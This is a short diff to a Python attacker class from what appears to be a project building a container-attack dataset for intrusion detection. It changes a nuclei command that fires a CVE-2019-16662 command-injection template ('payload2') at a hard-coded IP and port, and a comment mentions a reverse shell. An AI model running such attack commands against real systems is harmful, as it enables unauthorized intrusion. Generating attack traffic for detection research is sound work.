@@ -3,7 +3,7 @@ from attackConfig import *
 
 
 
-class OSCI_CVE_2019_16662_Attacker1(AttackerBase):
+class OSCI_CVE_2019_16662_Attacker3(AttackerBase):
     
     def __init__(self):
         self.commandRunner = CommandRunner()
@@ -19,7 +19,7 @@ class OSCI_CVE_2019_16662_Attacker1(AttackerBase):
     def main(self):
         print("Main method started")
         #self.commandRunner.runCommand('echo "nuclei script started" ')     
-        self.commandRunner.runCommand('nuclei -u http://144.122.71.18:30004 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-16662.yaml')
+        self.commandRunner.runCommand('nuclei -u http://144.122.71.18:30004 -t ~/A-NOVEL-CONTAINER-ATTACKS-DATASET-FOR-INTRUSION-DETECTION/Scripts/YAMLs/CVE-2019-16662_payload2.yaml')
 
 
     # Reverse shell will be handle later...
